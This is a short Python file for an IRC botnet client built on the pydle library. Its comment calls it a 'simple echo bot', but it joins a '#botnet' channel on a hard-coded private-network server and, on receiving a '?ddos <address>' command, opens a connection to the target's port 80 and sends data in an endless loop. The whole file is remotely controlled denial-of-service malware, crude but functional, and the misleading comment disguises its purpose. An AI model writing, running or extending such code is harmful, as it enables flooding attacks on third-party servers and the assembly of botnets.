import pydle
import socket, sys


# Simple echo bot.
class MalBot(pydle.Client):

    def on_connect(self):
        self.channel = "#botnet"
        self.join(self.channel)

    def on_join(self, channel, user):
        super().on_join(channel, user)
        self.message(channel, 'Joined botnet')

    def attack(self, target):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, 80))
        while True:
            s.send(str.encode("I'm DDOSing your ass"))
            print(">> GET /" + target + " HTTP/1.1")

    def on_message(self, source, target, message):
        if message.startswith("?ddos"):
            address = message.split()[1]
            self.message(self.channel, "Acknowledged request to DDOS {}".format(address))
            self.attack(address)


client = MalBot('MalBot', realname='MalBot')
client.connect('192.168.67.130', 6697, tls=False, tls_verify=False, password="botnet")
client.handle_forever()
